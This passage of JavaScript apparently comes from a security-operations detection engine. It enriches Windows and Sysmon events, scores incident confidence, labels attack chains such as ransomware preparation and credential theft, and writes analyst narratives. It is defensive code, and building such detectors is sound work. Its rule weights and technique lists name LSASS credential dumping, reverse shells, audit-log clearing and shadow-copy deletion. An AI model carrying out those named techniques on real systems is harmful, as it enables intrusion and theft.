      5157: { label: 'Network Connection Blocked', category: 'network',       icon: '🚫',
               extract: e => `Blocked: "${e.process||e.Application||'?'}" → ${e.destIp||'?'}:${e.destPort||'?'}` },
      4663: { label: 'Object Access Attempt',    category: 'file',            icon: '📋',
               extract: e => `"${e.user}" ${e.AccessMask==='0x2'?'wrote to':e.AccessMask==='0x1'?'read':'accessed'} "${e.ObjectName||'?'}" (Mask: ${e.AccessMask||'?'})` },
      4103: { label: 'PowerShell Module Log',    category: 'execution',       icon: '🔵',
               extract: e => `PS Module: "${(e.Payload||e.message||'?').slice(0,150)}"` },
      4104: { label: 'PowerShell Script Block',  category: 'execution',       icon: '🔵',
               extract: e => `Script block: "${(e.ScriptBlockText||e.message||'?').slice(0,200)}"` },
      7045: { label: 'New Service Installed',    category: 'persistence',     icon: '⚙️',
               extract: e => `Service "${e.ServiceName||'?'}" installed — Path: "${e.ImagePath||e.ServiceFileName||'?'}"` },
      4697: { label: 'Service Installed',        category: 'persistence',     icon: '⚙️',
               extract: e => `Service "${e.ServiceName||'?'}" installed — Path: "${e.ImagePath||'?'}"` },
      1102: { label: 'Audit Log Cleared',        category: 'defense-evasion', icon: '🗑️',
               extract: e => `Security audit log cleared by "${e.user}" on ${e.computer||'?'}` },
      4657: { label: 'Registry Value Modified',  category: 'defense-evasion', icon: '🔧',
               extract: e => `Registry key "${e.ObjectName||'?'}" modified by "${e.user}"` },
      // Sysmon
      1:    { label: 'Sysmon: Process Create',   category: 'process',         icon: '⚙️',
               extract: e => `"${e.process||e.Image||'?'}" [PID:${e.ProcessId||'?'}] ← "${e.parentProcess||e.ParentImage||'?'}"` },
      3:    { label: 'Sysmon: Network Connect',  category: 'network',         icon: '🌐',
               extract: e => `"${e.process||e.Image||'?'}" → ${e.DestinationIP||e.destIp||'?'}:${e.DestinationPort||e.destPort||'?'}` },
      7:    { label: 'Sysmon: Image Load',       category: 'execution',       icon: '📦',
               extract: e => `"${e.Image||'?'}" loaded "${e.ImageLoaded||'?'}"` },
      11:   { label: 'Sysmon: File Create',      category: 'file',            icon: '📄',
               extract: e => `File created: "${e.TargetFilename||'?'}" by "${e.process||e.Image||'?'}"` },
      13:   { label: 'Sysmon: Registry Set',     category: 'persistence',     icon: '🔧',
               extract: e => `Registry set: "${e.TargetObject||'?'}" = "${(e.Details||'?').slice(0,100)}"` },
      17:   { label: 'Sysmon: Pipe Created',     category: 'execution',       icon: '🔗',
               extract: e => `Named pipe "${e.PipeName||'?'}" created by "${e.process||'?'}"` },
      25:   { label: 'Sysmon: Process Tamper',   category: 'defense-evasion', icon: '⚠️',
               extract: e => `Process "${e.process||e.Image||'?'}" tampered` },
    };

    // ── Enrich a raw event with analyst-readable detail ────────────
    function _enrichEventDetail(event) {
      const eid = parseInt(event.EventID, 10);
      const enrichment = EVENT_ENRICHMENT[eid];
      if (!enrichment) {
        return {
          label: `Event ${isNaN(eid) ? '?' : eid}`,
          category: event._logSource || 'unknown',
          icon: '📋',
          detail: event.message || event.msg || event.commandLine || `EventID ${eid}`,
          enriched: false,
        };
      }
      return {
        label: enrichment.label,
        category: enrichment.category,
        icon: enrichment.icon,
        detail: enrichment.extract(event),
        enriched: true,
      };
    }

    // ════════════════════════════════════════════════════════════════
    //  SOC v5 — CONFIDENCE SCORING ENGINE
    //  Multi-factor confidence score with explainable reasons.
    //  Score 0–100 with categories: Possible (0–39), Likely (40–69),
    //  Strongly Indicative (70–89), Confirmed (90–100)
    // ════════════════════════════════════════════════════════════════
    const CONFIDENCE_FACTORS = {
      // Behavior rarity weights (higher = rarer = more suspicious)
      behaviorRarity: {
        'CSDE-WIN-017': 22, // PS from Office — very rare in prod
        'CSDE-WIN-018': 18, // PS script block with IOC
        'CSDE-WIN-014': 25, // LSASS dump — almost always malicious
        'CSDE-WIN-013': 20, // VSS deletion — rare except ransomware
        'CSDE-WIN-021': 25, // Ransomware extension — definitive
        'CSDE-WIN-019': 18, // Service in temp path
        'CSDE-LNX-004': 22, // Reverse shell
        'CSDE-WIN-022': 15, // C2 network connection
        'CSDE-WIN-020': 12, // SMB admin share
        'CSDE-WIN-015': 10, // Scheduled task
        'CSDE-WIN-016': 12, // WMI execution
        'CSDE-LNX-002': 10, // Sudo escalation
        'CSDE-WIN-001': 5,  // Single logon fail (common)
        'CSDE-WIN-002': 12, // Brute force (multiple fails)
        'CSDE-WIN-003': 15, // Success after failure
        // NEW v7
        'CSDE-WIN-023': 30, // Log cleared — definitive compromise
        'CSDE-WIN-024': 28, // Audit policy tampered
        'CSDE-WIN-027': 25, // Security service stopped
        'CSDE-WIN-025': 22, // Password spray
        'CSDE-WIN-026': 18, // Credential stuffing
        'CSDE-WIN-028': 12, // WSL execution
        'CSDE-WIN-029': 28, // Web shell / exploit
      },
      // Sequence logic bonuses (multi-stage = higher confidence)
      sequenceBonus: {
        twoStage: 8,
        threeStage: 15,
        fourPlusStage: 22,
      },
      // Privilege level bonus
      privilegeBonus: {
        system: 12,
        administrator: 8,
        root: 12,
        privileged: 8,
      },
      // Known malicious combinations (technique pairs)
      knownMaliciousCombos: [
        { techniques: ['T1059.001', 'T1003.001'], bonus: 20, label: 'PS + LSASS dump (credential theft chain)' },
        { techniques: ['T1059.001', 'T1490'],     bonus: 18, label: 'PS + Shadow Copy deletion (ransomware prep)' },
        { techniques: ['T1486', 'T1490'],         bonus: 22, label: 'Encryption + Shadow deletion (active ransomware)' },
        { techniques: ['T1110.003', 'T1021.002'], bonus: 15, label: 'Brute force + SMB lateral movement' },
        { techniques: ['T1047', 'T1543.003'],     bonus: 14, label: 'WMI execution + service persistence' },
        { techniques: ['T1059.001', 'T1543.003'], bonus: 16, label: 'PS execution + service persistence' },
        { techniques: ['T1566.001', 'T1059.001'], bonus: 18, label: 'Spear phishing + PS execution' },
        { techniques: ['T1021.002', 'T1003.001'], bonus: 17, label: 'SMB lateral + credential dump' },
      ],
    };

    // ── Compute forensic confidence score for a cluster ────────────
    // Returns { score: 0-100, level: string, reasons: string[] }
    function _computeForensicConfidence(cluster, parentDet) {
      let score = 30; // baseline: single event, unverified
      const reasons = [];

      const techniques = [...new Set(cluster.map(d => d.mitre?.technique || d.technique || '').filter(Boolean))];
      const ruleIds    = cluster.map(d => d.ruleId || '');

      // 1. Behavior rarity bonus
      let rarityBonus = 0;
      ruleIds.forEach(rid => {
        const r = CONFIDENCE_FACTORS.behaviorRarity[rid] || 0;
        if (r > rarityBonus) rarityBonus = r;
      });
      if (rarityBonus > 0) {
        score += rarityBonus;
        const ruleDesc = cluster.find(d => CONFIDENCE_FACTORS.behaviorRarity[d.ruleId])?.ruleName || 'high-rarity behavior';
        reasons.push(`High behavior rarity (+${rarityBonus}): ${ruleDesc}`);
      }

      // 2. Sequence logic bonus
      if (cluster.length >= 4) {
        score += CONFIDENCE_FACTORS.sequenceBonus.fourPlusStage;
        reasons.push(`Multi-stage kill chain (${cluster.length} stages) (+${CONFIDENCE_FACTORS.sequenceBonus.fourPlusStage})`);
      } else if (cluster.length === 3) {
        score += CONFIDENCE_FACTORS.sequenceBonus.threeStage;
        reasons.push(`3-stage attack sequence (+${CONFIDENCE_FACTORS.sequenceBonus.threeStage})`);
      } else if (cluster.length === 2) {
        score += CONFIDENCE_FACTORS.sequenceBonus.twoStage;
        reasons.push(`2-stage correlated detection (+${CONFIDENCE_FACTORS.sequenceBonus.twoStage})`);
      }

      // 3. Privilege level
      const user = (parentDet.user || '').toLowerCase();
      const isSystem = user.includes('system') || user.includes('nt authority');
      const isAdmin  = user.includes('admin') || user.includes('administrator') || user.includes('root');
      if (isSystem) {
        score += CONFIDENCE_FACTORS.privilegeBonus.system;
        reasons.push(`SYSTEM-level activity (+${CONFIDENCE_FACTORS.privilegeBonus.system})`);
      } else if (isAdmin) {
        score += CONFIDENCE_FACTORS.privilegeBonus.administrator;
        reasons.push(`Admin-level account (+${CONFIDENCE_FACTORS.privilegeBonus.administrator})`);
      }

      // 4. Known malicious technique combos
      for (const combo of CONFIDENCE_FACTORS.knownMaliciousCombos) {
        const hasAll = combo.techniques.every(t => techniques.includes(t));
        if (hasAll) {
          score += combo.bonus;
          reasons.push(`Known malicious combo: ${combo.label} (+${combo.bonus})`);
        }
      }

      // 5. Cross-log evidence bonus
      const hasLinkedEvents = cluster.some(d => d.linkedEvents && d.linkedEvents.length > 0);
      if (hasLinkedEvents) {
        score += 8;
        reasons.push('Cross-log corroborated evidence (+8)');
      }

      // 6. Critical severity multiplier
      const critCount = cluster.filter(d => (d.severity||d.aggregated_severity) === 'critical').length;
      if (critCount >= 2) {
        score += 5 * critCount;
        reasons.push(`${critCount} critical-severity detections (+${5*critCount})`);
      }

      score = Math.min(100, Math.max(0, Math.round(score)));

      let level;
      if (score >= 90) level = 'Confirmed';
      else if (score >= 70) level = 'Strongly Indicative';
      else if (score >= 40) level = 'Likely';
      else level = 'Possible';

      return { score, level, reasons };
    }

    // ════════════════════════════════════════════════════════════════
    //  SOC v5 — BEHAVIOR-AWARE MULTI-TECHNIQUE PARENT CLASSIFICATION
    //  Instead of using the single parent detection's title,
    //  generate a behavior-aware multi-technique incident title
    //  that reflects the full attack chain semantics.
    // ════════════════════════════════════════════════════════════════
    const BEHAVIOR_TITLES = [
      // Ransomware patterns
      { id: 'ransomware-full',
        match: tactics => tactics.includes('impact') && tactics.includes('defense-evasion') && tactics.includes('execution'),
        title: 'Ransomware Impact Preparation (Multi-Stage)',
        description: 'Evidence of execution, backup removal, and encryption — consistent with active ransomware deployment.',
        phase: 'Impact' },
      { id: 'ransomware-impact',
        match: (tactics, techs) => techs.includes('T1486') || techs.includes('T1490'),
        title: 'Data Encryption & Backup Destruction (Ransomware)',
        description: 'File encryption and shadow copy deletion detected — strongly indicative of ransomware payload.',
        phase: 'Impact' },
      // APT patterns
      { id: 'apt-full-lifecycle',
        match: tactics => tactics.includes('execution') && tactics.includes('credential-access') &&
                          tactics.includes('lateral-movement') && tactics.includes('persistence'),
        title: 'Advanced Persistent Threat — Full Kill Chain',
        description: 'Complete APT lifecycle: initial execution, credential theft, lateral movement, and persistence mechanism installed.',
        phase: 'Multi-Stage' },
      { id: 'apt-cred-lateral',
        match: (tactics, techs) => techs.includes('T1003.001') && tactics.includes('lateral-movement'),
        title: 'Credential Theft + Lateral Movement (APT Behavior)',
        description: 'LSASS credential dump followed by lateral movement — advanced threat actor pattern.',
        phase: 'Lateral Movement' },
      // Spear phishing execution chain
      { id: 'spearphish-exec',
        match: (tactics, techs) => (techs.includes('T1566.001') || techs.includes('T1059.001')) &&
                                   (tactics.includes('execution') && tactics.includes('persistence')),
        title: 'Spear Phishing → Execution → Persistence Chain',
        description: 'Office/browser parent spawning PowerShell, followed by persistence mechanism — spear phishing attack chain.',
        phase: 'Execution' },
      { id: 'ps-execution',
        match: (tactics, techs) => techs.includes('T1059.001') && tactics.includes('execution'),
        title: 'PowerShell Execution Chain (Code Execution)',
        description: 'Suspicious PowerShell execution detected with malicious indicators.',
        phase: 'Execution' },
      // Privilege escalation chain
      { id: 'privesc-persist',
        match: tactics => tactics.includes('privilege-escalation') && tactics.includes('persistence'),
        title: 'Privilege Escalation → Persistence (Account Takeover)',
        description: 'Privilege escalation followed by persistence — consistent with account takeover.',
        phase: 'Privilege Escalation' },
      // Brute force compromise
      { id: 'bruteforce-compromise',
        match: (tactics, techs) => tactics.includes('credential-access') && tactics.includes('lateral-movement'),
        title: 'Credential Attack → Lateral Movement',
        description: 'Credential attacks followed by lateral movement — brute force compromise chain.',
        phase: 'Credential Access' },
      { id: 'bruteforce-only',
        match: (tactics, techs) => techs.includes('T1110.003') || techs.includes('T1110'),
        title: 'Brute Force Credential Attack',
        description: 'Multiple authentication failures indicating brute-force or password-spray attack.',
        phase: 'Credential Access' },
      // Defense evasion
      { id: 'defense-evasion-chain',
        match: tactics => tactics.includes('defense-evasion') && (tactics.includes('execution') || tactics.includes('persistence')),
        title: 'Defense Evasion + Execution/Persistence',
        description: 'Defense evasion techniques combined with execution or persistence — sophisticated attacker behavior.',
        phase: 'Defense Evasion' },
      // Generic multi-tactic
      { id: 'multi-tactic',
        match: tactics => tactics.length >= 3,
        title: 'Multi-Tactic Attack Sequence',
        description: 'Three or more distinct attack tactics detected — coordinated attacker behavior.',
        phase: 'Multi-Stage' },
    ];

    // ── Classify an incident by its behavior pattern ───────────────
    function _classifyIncidentBehavior(cluster) {
      const tactics   = [...new Set(cluster.map(d => d.mitre?.tactic || '').filter(Boolean))];
      const techs     = [...new Set(cluster.map(d => d.mitre?.technique || d.technique || '').filter(Boolean))];
      const ruleIds   = cluster.map(d => d.ruleId || '');

      // Try each behavior title pattern in order of specificity
      for (const bt of BEHAVIOR_TITLES) {
        try {
          if (bt.match(tactics, techs, ruleIds)) {
            return {
              behaviorId   : bt.id,
              behaviorTitle: bt.title,
              description  : bt.description,
              phase        : bt.phase,
              tactics,
              techniques   : techs,
            };
          }
        } catch { /* continue */ }
      }

      // Fallback: use parent detection title
      return {
        behaviorId   : 'generic',
        behaviorTitle: null, // will use parent.detection_name
        description  : null,
        phase        : tactics[0] || 'Unknown',
        tactics,
        techniques   : techs,
      };
    }

    // ════════════════════════════════════════════════════════════════
    //  SOC v5 — CONFIDENCE-BASED NARRATIVE ENGINE
    //  Generates analyst-quality narratives using confidence-calibrated
    //  language: Possible / Likely / Strongly Indicative / Confirmed
    // ════════════════════════════════════════════════════════════════
    const CONFIDENCE_LANGUAGE = {
      'Possible':             'possibly',
      'Likely':               'likely',
      'Strongly Indicative':  'strongly indicative of',
      'Confirmed':            'confirmed',
    };

    // ── Generate a forensic narrative for an incident ──────────────
    function _generateForensicNarrative(inc, behavior, confidence) {
      const host    = inc.host || 'unknown host';
      const user    = inc.user || 'unknown user';
      const tactics = (inc.mitreTactics || []).map(t => t.replace(/-/g,' ')).join(', ');
      const techStr = (inc.techniques  || []).slice(0,5).join(', ');
      const durStr  = _formatDuration(inc.duration_ms || 0);
      const lang    = CONFIDENCE_LANGUAGE[confidence.level] || 'indicative of';

      let narrative = '';
      switch (behavior.behaviorId) {
        case 'ransomware-full':
        case 'ransomware-impact':
          narrative = `CRITICAL: Evidence on "${host}" is ${lang} active ransomware deployment. ` +
            `${inc.detectionCount} correlated events across ${durStr} show: execution, ` +
            `shadow copy deletion (backup destruction), and file encryption. ` +
            `Immediate isolation recommended. User context: "${user}". MITRE: ${techStr}.`;
          break;
        case 'apt-full-lifecycle':
          narrative = `HIGH PRIORITY: Activity on "${host}" is ${lang} an advanced persistent threat. ` +
            `Full kill chain observed over ${durStr}: initial code execution, credential theft (LSASS), ` +
            `lateral movement, and persistence installation. Threat actor foothold likely established. ` +
            `User context: "${user}". MITRE: ${techStr}.`;
          break;
        case 'apt-cred-lateral':
          narrative = `Activity on "${host}" is ${lang} credential theft enabling lateral movement. ` +
            `LSASS memory dump followed by remote share access over ${durStr}. ` +
            `Attacker may have obtained plaintext credentials. User: "${user}". MITRE: ${techStr}.`;
          break;
        case 'spearphish-exec':
          narrative = `Activity on "${host}" is ${lang} a spear phishing attack chain. ` +
            `Office/browser application spawned PowerShell (${durStr} sequence), followed by ` +
            `persistence mechanism. This pattern matches spear phishing document delivery. User: "${user}". MITRE: ${techStr}.`;
          break;
        case 'ps-execution':
          narrative = `Suspicious PowerShell execution on "${host}" is ${lang} malicious activity. ` +
            `Script block or encoded command contains known malicious patterns. User: "${user}". CMD evidence logged. MITRE: ${techStr}.`;
          break;
        case 'bruteforce-compromise':
          narrative = `Credential attack against "${host}" is ${lang} a brute-force compromise. ` +
            `Authentication failures followed by lateral movement over ${durStr}. ` +
            `Account "${user}" may be compromised. MITRE: ${techStr}.`;
          break;
        case 'bruteforce-only':
          narrative = `${inc.detectionCount} authentication failures on "${host}" over ${durStr} are ${lang} ` +
            `a brute-force or password-spray attack targeting account "${user}". MITRE: ${techStr}.`;
          break;
        default:
          narrative = `${inc.detectionCount} correlated detection${inc.detectionCount>1?'s':''} on "${host}" ` +
            `over ${durStr} ${lang} multi-stage attack behavior. Tactics: ${tactics}. User: "${user}". MITRE: ${techStr}.`;
      }
      return narrative;
    }

    // ── Format duration in human-readable form ─────────────────────
    function _formatDuration(ms) {
      if (!ms || ms <= 0) return '< 1s';
      if (ms < 1000) return `${ms}ms`;
      if (ms < 60000) return `${Math.round(ms/1000)}s`;
      const m = Math.floor(ms / 60000);
      const s = Math.round((ms % 60000) / 1000);
      if (m < 60) return s > 0 ? `${m}m ${s}s` : `${m}m`;
      const h = Math.floor(m / 60);
      const rm = m % 60;
      return rm > 0 ? `${h}h ${rm}m` : `${h}h`;
    }

    // ════════════════════════════════════════════════════════════════
    //  SOC v5 — FULL ATTACK PHASE MODELER
    //  Maps each detection to a named attack phase and orders them
    //  chronologically. Phases: Initial Access → Execution →
    //  Privilege Escalation → Defense Evasion → Credential Access →
    //  Lateral Movement → Collection → Persistence → Impact
    // ════════════════════════════════════════════════════════════════
    const ATTACK_PHASE_ORDER = [
      'initial-access', 'execution', 'privilege-escalation',
      'defense-evasion', 'credential-access', 'discovery',
      'lateral-movement', 'collection', 'persistence', 'command-and-control', 'impact',
    ];

    // Map MITRE tactics to canonical attack phases
    function _tacticToPhase(tactic) {
      const t = (tactic || '').toLowerCase().replace(/\s+/g, '-');
      const phaseMap = {
        'initial-access':        'Initial Access',
        'execution':             'Execution',
        'persistence':           'Persistence',
        'privilege-escalation':  'Privilege Escalation',
        'defense-evasion':       'Defense Evasion',
        'credential-access':     'Credential Access',
        'discovery':             'Discovery',
        'lateral-movement':      'Lateral Movement',
        'collection':            'Collection',
        'command-and-control':   'C2',
        'exfiltration':          'Exfiltration',
        'impact':                'Impact',
        'authentication':        'Authentication',
        'network':               'Network',
        'file':                  'File Activity',
        'process':               'Process Activity',
      };
      return phaseMap[t] || _capitalizeWords(t);
    }

    function _capitalizeWords(str) {
      return String(str||'').replace(/-/g,' ').replace(/\b\w/g, c => c.toUpperCase());
    }

    // ════════════════════════════════════════════════════════════════
    //  BCE v10 — BEHAVIORAL FINGERPRINT CLASSIFIER
    //  Scans a detection's process name + command line for known
    //  attacker tools and overrides/refines tactic+technique assignment.
    // ════════════════════════════════════════════════════════════════
    function _applyBehavioralFingerprint(det) {
      const cmd   = (det.commandLine || '').toLowerCase();
      const proc  = (det.process     || det.NewProcessName || '').toLowerCase().replace(/.*[\\\/]/, '');
      const combined = cmd + ' ' + proc;

      for (const [tool, fp] of Object.entries(BEHAVIORAL_FINGERPRINTS)) {
        if (combined.includes(tool)) {
          // Only override if fingerprint is more specific than current
          const curPhase   = PHASE_ORDER[(det.mitre?.tactic || '').toLowerCase().replace(/\s+/g,'-')] ?? 99;
          const fpPhase    = PHASE_ORDER[fp.tactic] ?? 99;
          // Always apply if no MITRE assigned yet; otherwise only if fingerprint is later in kill chain
          if (!det.mitre?.technique || fpPhase >= curPhase) {
            det._fingerprintedTool = tool;
            det._fingerprintSource = 'behavioral';
            // Only override if not already set by a more specific rule
            if (!det.mitre || !det.mitre.technique || det.mitre.technique.length < fp.technique.length) {
              det.mitre = { technique: fp.technique, name: fp.name, tactic: fp.tactic };
              det.technique = fp.technique;
              det._role = fp.role;
            }
            if ((SEV_WEIGHT[fp.severity] || 0) > (SEV_WEIGHT[det.aggregated_severity || det.severity] || 0)) {
              det.aggregated_severity = fp.severity;
            }
          }
          break;
        }
      }
      return det;
    }

    // ════════════════════════════════════════════════════════════════
    //  BCE v10 — ADAPTIVE TIME WINDOW SELECTOR
    //  Returns the appropriate correlation window in ms for a given tactic.
    //  Unlike fixed windows, this adapts to how fast each tactic moves.
    // ════════════════════════════════════════════════════════════════
    function _getAdaptiveWindow(tactic) {
      if (!CFG.BCE_ADAPTIVE_WINDOWS) return CFG.ACE_PROXIMITY_WINDOW_MS;
      const t = (tactic || '').toLowerCase().replace(/\s+/g, '-');
      return TACTIC_ADAPTIVE_WINDOWS[t] || CFG.ACE_PROXIMITY_WINDOW_MS;
    }

    // ════════════════════════════════════════════════════════════════
    //  BCE v10 — CONTEXTUAL INFERENCE ENGINE
    //  When a mid/late-stage detection fires without observed preceding
    //  stages, this engine inserts logically required inferred stages
    //  to prevent single-node incident collapse.
    //
    //  Rules:
    //  • Only infer stages NOT already present in the cluster
    //  • Each inferred stage is marked inferred:true with confidence score
    //  • Inferred stages are inserted BEFORE the first observed stage
    //  • Minimum chain depth enforced (BCE_MIN_CHAIN_DEPTH = 3)
    // ════════════════════════════════════════════════════════════════
    function _inferMissingStages(cluster, firstObservedTs) {
      if (!CFG.BCE_INFER_STAGES) return [];

      // Collect observed tactics in this cluster
      const observedTactics = new Set(
        cluster.map(d => (d.mitre?.tactic || d.category || '').toLowerCase().replace(/\s+/g,'-'))
               .filter(Boolean)
      );

      // Find the "deepest" observed tactic (latest in kill chain)
      let deepestPhase = 0;
      let deepestTactic = '';
      observedTactics.forEach(t => {
        const p = PHASE_ORDER[t] ?? 0;
        if (p > deepestPhase) { deepestPhase = p; deepestTactic = t; }
      });

      // Only infer if the deepest observed tactic is mid/late stage
      const MID_LATE = new Set(['credential-access','lateral-movement','impact',
                                'privilege-escalation','exfiltration','collection']);
      if (!MID_LATE.has(deepestTactic)) return [];

      const templates = INFERRED_PRECURSORS[deepestTactic] || [];
      const inferred  = [];
      let   inferTs   = firstObservedTs - 180_000; // place inferred stages 3min before first real

      for (const tmpl of templates) {
        // Skip if this tactic is already observed
        if (observedTactics.has(tmpl.tactic)) continue;

        const confScore = Math.min(
          CFG.BCE_INFER_CONFIDENCE_BASE + (deepestPhase * 3),
          75  // cap inferred confidence at 75%
        );

        const inferredStage = {
          id               : `INFERRED-${tmpl.tactic.toUpperCase().replace(/-/g,'_')}-${Date.now()}`,
          ruleId           : `BCE-INFER-${tmpl.tactic.toUpperCase().replace(/-/g,'_')}`,
          detection_name   : tmpl.name,
          ruleName         : tmpl.name,
          title            : tmpl.name,
          severity         : 'medium',
          aggregated_severity: 'medium',
          riskScore        : Math.round(confScore * 0.6),
          confidence_score : confScore,
          event_count      : 0,
          // MITRE
          mitre            : { technique: tmpl.technique, name: tmpl.name, tactic: tmpl.tactic },
          technique        : tmpl.technique,
          category         : tmpl.tactic,
          // Inherit host/user from cluster parent
          computer         : cluster[0]?.computer || cluster[0]?.host || '',
          host             : cluster[0]?.computer || cluster[0]?.host || '',
          user             : cluster[0]?.user || '',
          srcIp            : cluster[0]?.srcIp || '',
          // Temporal placement — before first real event
          first_seen       : new Date(inferTs).toISOString(),
          last_seen        : new Date(inferTs).toISOString(),
          timestamp        : new Date(inferTs).toISOString(),
          // Inferred metadata
          inferred         : true,
          inferredFrom     : deepestTactic,
          inferredConfidence: confScore,
          _role            : tmpl.role,
          raw_detections   : [],
          variants_triggered: [],
          evidence         : [],
        };

        inferred.push(inferredStage);
        inferTs -= 60_000; // space each inferred stage 1 min apart
      }

      return inferred;
    }

    // ════════════════════════════════════════════════════════════════
    //  BCE v10 — MINIMUM CHAIN DEPTH ENFORCER
    //  Guarantees that every incident has at least BCE_MIN_CHAIN_DEPTH
    //  logical stages. Calls the inference engine if needed.
    //  Returns the (potentially expanded) cluster.
    // ════════════════════════════════════════════════════════════════
    function _enforceMinimumChainDepth(cluster) {
      if (!cluster.length) return cluster;
      const targetDepth = CFG.BCE_MIN_CHAIN_DEPTH;
      if (cluster.length >= targetDepth) return cluster;

      // Sort by timestamp to find first observed event
      const sorted = [...cluster].sort((a, b) => {
        return new Date(a.first_seen||a.timestamp||0) - new Date(b.first_seen||b.timestamp||0);
      });
      const firstTs = new Date(sorted[0].first_seen || sorted[0].timestamp || 0).getTime();

      // Try to infer missing preceding stages
      const inferredStages = _inferMissingStages(cluster, firstTs);

      // Combine observed + inferred, sorted by timestamp
      const combined = [...inferredStages, ...cluster].sort((a, b) => {
        return new Date(a.first_seen||a.timestamp||0) - new Date(b.first_seen||b.timestamp||0);
      });

      return combined.length >= targetDepth ? combined : combined;
    }

    // ════════════════════════════════════════════════════════════════
    //  BCE v10 — CHAIN-AWARE PROGRESSIVE RISK SCORER
    //  Unlike event-based scoring, this computes risk based on:
    //    • Number of stages (depth amplifier)
    //    • Deepest tactic reached (progression multiplier)
    //    • Privileged asset targeting (DC, Exchange, backup)
    //    • Observed vs inferred stages (quality discount)
    //    • Cross-host pivot presence
    // ════════════════════════════════════════════════════════════════
    function _computeProgressiveRisk(cluster, crossHost) {
      if (!CFG.BCE_PROGRESSIVE_RISK || !cluster.length) {
        return cluster.reduce((s, d) => Math.max(s, d.riskScore || 0), 0);
      }

      // 1. Base: aggregate individual riskScores (observed only, cap contribution)
      const observed = cluster.filter(d => !d.inferred);
      const baseRisk = observed.reduce((s, d) => s + Math.min(d.riskScore || 0, 40), 0);

      // 2. Find deepest phase reached
      const deepestTactic = observed.reduce((best, d) => {
        const tac = (d.mitre?.tactic || d.category || '').toLowerCase().replace(/\s+/g,'-');
        const ph  = PHASE_ORDER[tac] ?? 0;
        const bph = PHASE_ORDER[best] ?? 0;
        return ph > bph ? tac : best;
      }, 'initial-access');
      const progressionMult = STAGE_DEPTH_RISK_MULTIPLIER[deepestTactic] || 0.4;

      // 3. Stage depth amplifier — more stages = higher confidence = higher risk
      const depthBonus = Math.min((observed.length - 1) * 8, 30);

      // 4. Critical asset bonus — DC or backup targeted = +15
      const criticalAsset = observed.some(d => {
        const host = (d.computer || d.host || '');
        return CRITICAL_ASSET_PATTERNS.some(rx => rx.test(host));
      });
      const assetBonus = criticalAsset ? 15 : 0;

      // 5. Cross-host pivot bonus
      const crossHostBonus = crossHost ? 12 : 0;

      // 6. Combine with progression multiplier
      const rawScore = (baseRisk * progressionMult) + depthBonus + assetBonus + crossHostBonus;
      return Math.min(Math.round(rawScore), 100);
    }

    // ════════════════════════════════════════════════════════════════
    //  BCE v10 — DETECTION ROLE CLASSIFIER
    //  Assigns each detection an explicit lifecycle role
    //  (initial_access, execution, persistence, etc.)
    //  Used for stage labelling and chain-completeness checks.
    // ════════════════════════════════════════════════════════════════
    function _classifyDetectionRole(det) {
      if (det._role) return det._role;
      const tactic = (det.mitre?.tactic || det.category || '').toLowerCase().replace(/\s+/g,'-');
      const roleMap = {
        'initial-access'      : 'initial_access',
        'execution'           : 'execution',
        'persistence'         : 'persistence',
        'privilege-escalation': 'privilege_escalation',
        'defense-evasion'     : 'defense_evasion',
        'credential-access'   : 'credential_access',
        'discovery'           : 'discovery',
        'lateral-movement'    : 'lateral_movement',
        'collection'          : 'collection',
        'exfiltration'        : 'exfiltration',
        'impact'              : 'impact',
        'command-and-control' : 'command_and_control',
        'reconnaissance'      : 'reconnaissance',
      };
      return roleMap[tactic] || 'execution';
    }

    // ── Build attack phase timeline for an incident ─────────────────
    // ════════════════════════════════════════════════════════════════
    //  ACE v6 — FORENSIC PHASE TIMELINE BUILDER
    //  Builds a causally-ordered, chronologically correct phase timeline
    //  from a detection cluster. Uses DAG causal validation to ensure
    //  correct event ordering. Includes:
    //    • Real first_seen / last_seen per node (never 0ms)
    //    • Causal edge labels (e.g., "execution → lateral-movement")
    //    • Cross-host host transitions marked
    //    • Enriched event details per node
    //    • Phase order according to kill chain (Initial Access → Impact)
    // ════════════════════════════════════════════════════════════════
    function _buildPhaseTimeline(cluster) {
      if (!cluster || !cluster.length) return [];

      // Use causal DAG for ordering — nodes are STRICTLY chronological (guaranteed by _buildCausalDAG v8)
      const dag    = _buildCausalDAG(cluster);
      const sorted = dag.nodes; // chronological order — NEVER re-sort by phase index

      // Build a causal edge map: nodeIndex → successor nodeIndex[]
      const successors = new Map();
      dag.edges.forEach(e => {
        if (!successors.has(e.from)) successors.set(e.from, []);
        successors.get(e.from).push({ to: e.to, edgeType: e.edgeType, gap_ms: e.gap_ms });
      });

      // Build causal violation lookup: is node[i] involved in a violation?
      const violationNodes = new Set();
      (dag.causalViolations || []).forEach(v => {
        violationNodes.add(v.stage_a.index);
        violationNodes.add(v.stage_b.index);
      });

      let prevHost = '';
      return sorted.map((det, si) => {
        const tactic  = (det.mitre?.tactic || det.category || '').toLowerCase().replace(/\s+/g,'-');
        const phase   = _tacticToPhase(tactic);
        const ts      = det.first_seen || det.timestamp;
        const tsMs    = new Date(ts || 0).getTime();
        const lastMs  = new Date(det.last_seen || ts || 0).getTime();

        // Enriched events from evidence (limit to 5 for output size)
        const enrichedEv = (det.raw_detections || [det]).flatMap(rd =>
          (rd.evidence || [rd]).slice(0, 3).map(ev => _enrichEventDetail(ev || {}))
        ).slice(0, 5);

        // Raw evidence logs (for SOC analyst drill-down)
        const rawEvidenceLogs = (det.raw_detections || [det]).flatMap(rd =>
          (rd.evidence || [rd]).slice(0, 2)
        ).slice(0, 4).map(ev => ({
          EventID    : ev.EventID || ev.eventId || '',
          timestamp  : ev.timestamp || ev.TimeGenerated || '',
          computer   : ev.computer  || ev.Computer || '',
          user       : ev.user      || ev.SubjectUserName || ev.TargetUserName || '',
          commandLine: ev.commandLine || ev.CommandLine || '',
          process    : ev.process  || ev.NewProcessName || ev.Image || '',
          srcIp      : ev.srcIp    || ev.SourceIP || '',
          message    : (ev.message || ev.msg || '').slice(0, 300),
        }));

        // Causal edge label to next node
        const outEdges = (successors.get(si) || []).slice(0, 2).map(e => ({
          edgeType: e.edgeType,
          gap_ms  : e.gap_ms,
          gap_label: _formatDuration(e.gap_ms || 0),
        }));

        // Cross-host transition flag
        const curHost = det.computer || det.host || '';
        const isHostTransition = prevHost && curHost && curHost !== prevHost;
        prevHost = curHost || prevHost;

        // Phase order index for display only (NOT for sorting)
        const phaseIdx = PHASE_ORDER[tactic] ?? 99;

        // Stage-level causal validity
        const hasCausalViolation = violationNodes.has(si);

        // Stage confidence (from DAG stageConfidence array or fallback)
        const stageConf = (dag.stageConfidence && dag.stageConfidence[si] != null)
          ? dag.stageConfidence[si]
